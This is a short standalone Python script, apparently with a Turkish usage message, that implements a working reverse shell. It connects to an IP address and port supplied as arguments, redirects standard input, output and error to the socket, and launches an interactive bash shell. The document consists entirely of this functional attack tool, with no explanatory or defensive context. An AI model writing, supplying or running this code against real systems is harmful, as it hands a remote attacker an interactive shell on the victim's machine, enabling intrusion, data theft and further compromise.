#!/usr/bin/env python3
import socket, subprocess, os, sys

def connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Kullanım: {sys.argv[0]} <IP> <PORT>")
        sys.exit(1)
    connect(sys.argv[1], int(sys.argv[2]))
